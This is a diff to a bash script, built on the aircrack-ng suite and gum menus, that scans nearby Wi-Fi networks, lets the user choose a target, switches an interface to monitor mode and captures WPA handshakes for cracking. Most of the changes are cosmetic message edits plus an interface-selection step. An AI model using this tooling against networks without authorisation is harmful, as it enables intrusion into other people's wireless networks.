@@ -45,9 +45,9 @@ function show_system_info() {
 
 function run_airodump() {
     local interface=$1
-    gum style --bold "    Scanning for Wi-Fi networks on interface: $interface"
-    gum style "    ATTENTION: Make sure when you press Ctrl + C you are in the xterm window, not your main terminal."
-    gum style "    When finished scanning, press Ctrl + C"
+    gum style --bold "Scanning for Wi-Fi networks on interface: $interface"
+    gum style "ATTENTION: Make sure when you press Ctrl + C you are in the xterm window, not your main terminal."
+    gum style "When finished scanning, press Ctrl + C"
     # Calculate position - adjust these if your screen or font size differs
     rm -f outputfile*.csv
     local screen_width=1920
@@ -66,7 +66,7 @@ function filter_info() {
     local input_file="outputfile-01.csv"
     local output_file="ap_info.csv"
     awk -F ',' 'BEGIN {OFS=","} {if ($1 != "") print $1, $4, $14, $6, $7}' "$input_file" > "$output_file"
-    gum style "    Filtered information saved in $output_file"
+    gum style "Filtered information saved in $output_file"
     cat "$output_file" | awk -F ',' '/,,,/{p++} p==1 && NF>1' | sed '1,2d; s/,,,,//g' | sort -u >> final_result.txt
     rm -rf "outputfile-01.csv"
     rm -rf "ap_info.csv"
@@ -101,12 +101,12 @@ function choseTargetAp() {
 
     echo
 
-    target_line=$(printf "%s\n" "${gum_choices[@]}" | gum choose --header="    Choose a target Wi-Fi network:")
+    target_line=$(printf "%s\n" "${gum_choices[@]}" | gum choose --header="Choose a target Wi-Fi network:")
     selected=$(echo "$target_line" | cut -d '|' -f1 | xargs)
     bssid=$(echo "$selected" | awk '{print $1}')
     channel=$(echo "$selected" | awk '{print $4}')
-    gum style --bold "    Selected Target BSSID → $bssid"
-    gum style --bold "    Selected Target channel → $channel"
+    gum style --bold "Selected Target BSSID → $bssid"
+    gum style --bold "Selected Target channel → $channel"
     
     startAttacking $bssid $channel
 }
@@ -114,7 +114,7 @@ function choseTargetAp() {
 function startAttacking() {
     local targetBSSID=$1
     local targetChannel=$2
-    gum confirm "    Start get handshake file" && hand_shake="yes" || hand_shake="no"
+    gum confirm "Start get handshake file" && hand_shake="yes" || hand_shake="no"
     if [[ "$hand_shake" == "yes" ]]; then
         aircrack_start "$handshake_file" "$targetBSSID"  
         gum style --foreground 212 "      Starting handshake capture process..."
@@ -150,15 +150,29 @@ function aircrack_start() {
 
 
 function check_monitor_mode_support() {
+    interfaces=$(iw dev | awk '$1=="Interface"{print $2}')
+    if [[ -z "$interfaces" ]]; then
+        echo "No wireless interfaces found that support monitor mode."
+        exit 1
+    fi
+
+    interface=$(echo "$interfaces" | gum choose --header="Select a wireless interface (Monitor mode capable):")
+    if [[ -z "$interface" ]]; then
+        echo "No interface selected. Exiting."
+        exit 1
+    fi
     choice=$(echo -e "Yes\nNo" | gum choose --height=2 --header="Switch ($interface) to monitor mode?")
     if [[ "$choice" == "Yes" ]]; then
-        echo -e "    $interface switched to monitor mode!"
-        airmon-ng start "$interface" >> /dev/null
+        echo -e "$interface switched to monitor mode!"
+        airmon-ng start "$interface" > /dev/null
     else
         echo -e "Sorry, we cannot run this script without Monitor mode!"
         exit 1
     fi
 }
+
+
+
 
 
 function checkRoot () { 
@@ -174,27 +188,28 @@ function checkRoot () {
 
 
 function checkTools() {
-    gum style --bold "    Checking required tools..."
+    gum style --bold "Checking required tools..."
+    echo ""
     tools=("aircrack-ng" "airodump-ng" "aireplay-ng" "xterm")
     tools_found=0
     missing_tools=()
     for tool in "${tools[@]}"; do
         sleep 0.2
         if ! command -v "$tool" &> /dev/null; then
-            gum style "    $tool    not found"
+            gum style "   $tool    not found"
             missing_tools+=("$tool")
         else
-            gum style --foreground=212 "    found    $tool"
+            gum style --foreground=212 "found    $tool"
             ((tools_found++))
         fi
     done
     echo
     if [ "$tools_found" -eq "${#tools[@]}" ]; then
-        gum style --bold "    All tools found. Proceeding..."
+        gum style --bold "All tools found. Proceeding..."
     else
-        gum style --bold "    Some tools are missing:"
+        gum style --bold "Some tools are missing:"
         for tool in "${missing_tools[@]}"; do
-            gum style "    Try installing with: sudo apt-get install $tool"
+            gum style "Try installing with: sudo apt-get install $tool"
         done
         exit 1
     fi
